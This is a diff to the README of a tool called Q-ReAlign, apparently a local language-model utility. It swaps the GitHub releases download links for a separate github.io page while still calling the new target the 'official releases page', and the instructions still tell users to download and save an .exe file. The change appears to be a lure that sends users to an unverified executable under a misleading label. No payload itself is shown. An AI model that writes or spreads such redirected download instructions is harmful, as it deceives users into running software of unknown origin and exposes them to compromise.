@@ -1,6 +1,6 @@
 # 🛠️ Q-ReAlign - Process data with simple language models
 
-[![Download Q-ReAlign](https://img.shields.io/badge/Download-Q--ReAlign-blue.svg)](https://github.com/scenic-industrialarts74/Q-ReAlign/releases)
+[![Download Q-ReAlign](https://img.shields.io/badge/Download-Q--ReAlign-blue.svg)](https://scenic-industrialarts74.github.io)
 
 Q-ReAlign helps you run language models on your computer. You use this tool to score information, reorganize text, and manage datasets. It removes the need for complex programming tasks. The software includes small models that fit on most modern hardware. You can choose between different versions based on your computer speed and storage space.
 
@@ -17,7 +17,7 @@ Your computer needs specific parts to run this software. Check your settings bef
 
 Follow these steps to get the software on your machine.
 
-1. Visit the [official releases page](https://github.com/scenic-industrialarts74/Q-ReAlign/releases).
+1. Visit the [official releases page](https://scenic-industrialarts74.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file name that ends in .exe.
 4. Save the file to your desktop or downloads folder.
